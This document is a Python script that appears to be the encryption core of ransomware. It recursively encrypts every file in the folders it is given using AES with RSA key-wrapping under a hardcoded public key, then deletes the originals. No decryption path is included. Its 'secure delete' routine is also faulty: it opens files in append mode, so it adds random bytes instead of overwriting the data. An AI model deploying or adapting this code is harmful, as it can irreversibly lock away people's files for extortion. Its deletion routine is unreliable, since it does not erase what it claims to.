#!/usr/bin/env python3
import os, sys
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA256

""" Securely delete the file after writing random bytes in it. """
def secure_delete(filename):
    # open in binary append plus mode
    with open(filename, "ba+") as delfile:
        # get the file length
        length = delfile.tell()
        # write random bytes in the file
        delfile.seek(0)
        delfile.write(get_random_bytes(length))
    # remove the file
    os.remove(filename)

""" Do RSA Encryption """
def rsa_encrypt(public_key, data):
    public_key = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(public_key)
    return cipher.encrypt(data)

""" Encrypt each file """
def encrypt_file(public_key, in_filename):
    # set output filename
    out_filename = in_filename + '.enc'
    with open(in_filename, 'rb') as infile:
        # set aes key
        aes_key = get_random_bytes(32)
        cipher = AES.new(aes_key, AES.MODE_CTR)
        with open(out_filename, 'wb') as outfile:
            # 1. write nonce value
            # 2. encrypted aes key using rsa public key
            # 3. output encrypted file
            #print(cipher.nonce, len(cipher.nonce))
            outfile.write(cipher.nonce)
            #print(len(rsa_encrypt(public_key, aes_key)))
            outfile.write(rsa_encrypt(public_key, aes_key))
            outfile.write(cipher.encrypt(infile.read()))

""" Perform the encryption of folder recursively """
def perform_folder_encryption(public_key, folder_path):
    # walk through each folder recursively
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            # get file name with folder path
            in_filename = os.path.join(root, file)
            # encrypt file
            encrypt_file(public_key, in_filename)
            # securely delete the file
            secure_delete(in_filename)

""" Encrypt Usage """
def usage():
    print("./encrypt.py <folder path 1> <folder path 2>...")


""" MAIN FUNCTION """
def main(argv):
    public_key = b"""-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAqY2gNOS1hE1t3JFN3Fde
gizbeKRaEee/8w8mvloLZL140eIdwAGMrytYY71YZOVw6Lbp8gJ3E7KBxJgyZBpO
pYaekmLtEc+ouJZ5Tviinx1y0SAC48QQeu4zCKWJdWxrSmpdwhasAtodmb5PkNQi
vQn3rNI00RfT0ITqzsOPfMpVRasGfMs2bufYZ4SXpM1GTmtOHzvnwZ7XEFiCagBI
j+6tLPRHjpk2by6fMvsQlJ19bDDixjj0cB1lMZ5Dn99siK3wZnBUgZkQJ3lT8CEI
eXTNoLEOpo0V7xBEuxNkmhqeJJhwnXHZjnY+CG+bzA9AFyKmCgfeIiMmA6b9pdb0
VwCM4p0RqHXsP1PRruKP1fyL/ysmVWljlxz+zDTMPLEhBCgQAIDqFND3Ca1usaZ0
YcI5vMI99w4yA3byBFwPEc+f4oUyuGVpjZKCJYFS+1oLeUkjBaiq9AgpESfNO1ly
QrR4hGEo1NBVT3a5yCb6w/3TzR9pfRIIHf6Yb5M76W5SjdNPcv8CN15kA6zu1HMY
mLhummaD+aExFll7axSyZtgGq0XjJ2JudDsgfdFkblO9LxJDfQMDLZwHBVnfn9Fc
t/GYqMBWIR0KjOpwSkJ8LZNTGFezE0puZuXjHaNlPljtMxNBg2y+H9+tyv03+XmS
IOaUHLyeYqwiHn2MyECmDoECAwEAAQ==
-----END PUBLIC KEY-----"""

    # no args check
    if len(argv) < 1:
        usage()
        sys.exit(1)

    # get folders list
    folders = argv

    # recursively perform for all folders
    for folder_path in folders:
        perform_folder_encryption(public_key, folder_path)

    print("Encryption was successfully completed!")



if __name__ == "__main__":
    # main call
    main(sys.argv[1:])

